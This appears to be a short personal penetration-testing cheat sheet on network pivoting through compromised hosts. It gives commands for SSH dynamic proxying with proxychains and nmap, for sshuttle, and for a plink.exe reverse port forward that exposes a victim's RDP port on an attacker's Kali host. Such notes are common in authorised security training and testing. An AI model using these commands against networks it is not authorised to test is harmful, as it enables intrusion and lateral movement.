---
title: PIVOTING
updated: 2023-11-03 08:42:59Z
created: 2023-09-29 05:23:47Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# PIVOTING

## PROXYCHAINS

1.  Check proxychains config **/etc/proxychains4.conf**
2.  `proxychains`
3.  `ssh -f -N -D 9050 -i pivot root@<target IP_nic1>`
4.  `proxychains nmap <network IP of target_nic2>` (can use **\-sT**)
5.  `proxychains <command>` (eg proxychains firefox)

* * *

## SSHUTTLE

1.  `sshuttle -r root@<target IP_nic1> --ssh-cmd "ssh -i pivot"`
2.  Once running, **all commands** will run thru the proxy

## Port Forwading plink.exe

`plink.exe -l <username> -pw <password> <haker IP> -R <Attacker_Port_to_receive>:127.0.0.1:<Victim_port_to_Forward>`

**Example:**  
`plink -l root -pw password KALI_IP -R 3390:127.0.0.1:3389`

https://linuxize.com/post/how-to-setup-ssh-tunneling/